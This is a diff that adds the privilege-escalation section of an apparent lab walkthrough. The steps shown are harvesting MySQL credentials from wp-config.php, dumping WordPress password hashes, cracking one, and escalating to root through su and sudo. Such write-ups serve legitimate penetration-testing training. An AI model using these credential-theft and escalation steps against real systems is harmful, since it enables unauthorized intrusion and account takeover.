@@ -93,18 +93,71 @@ start a listener and use a PHP pnetest monkey reverse shell.
 
 ## 4.Privilege Escalation
 
+Navigate to `/var/www/html/wordpress` and see the content of `wp-config.php` :
+
+```text
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'rootpassword!');
+```
+
+connect to mysql on the localhost (stabilize your shell first) :
+
+```bash
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| deneme             |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
+| sys                |
+| wordpress          |
++--------------------+
+
+mysql> use wordpress;
+mysql> select * from wp_users;
+
++----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                        | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
++----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
+|  1 | root       | a318e4507e5a74604aafb45e4741edd3 | btrisk        | mdemir@btrisk.com |          | 2017-04-24 17:37:04 |                     |           0 | btrisk       |
+|  2 | admin      | 21232f297a57a5a743894a0e4a801fc3 | admin         | ikaya@btrisk.com  |          | 2017-04-24 17:37:04 |                     |           4 | admin        |
++----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
+exit
+```
+now crack the `btrisk` hash online or other tools, you find the cracked hash as `roottoor`
+
+change user to btrisk and privide the password :
+
+```bash
+www-data@ubuntu:/$ su btrisk
+su btrisk
+Password: roottoor
+
+btrisk@ubuntu:/$ sudo -l
+sudo -l
+[sudo] password for btrisk: roottoor
+
+Matching Defaults entries for btrisk on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User btrisk may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+    (ALL : ALL) ALL
 
 
+btrisk@ubuntu:/$ sudo su
+root@ubuntu:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
 
 
-
-
-
-
-
-
-
-
-
-
-
+ this is how you can root this machine :)
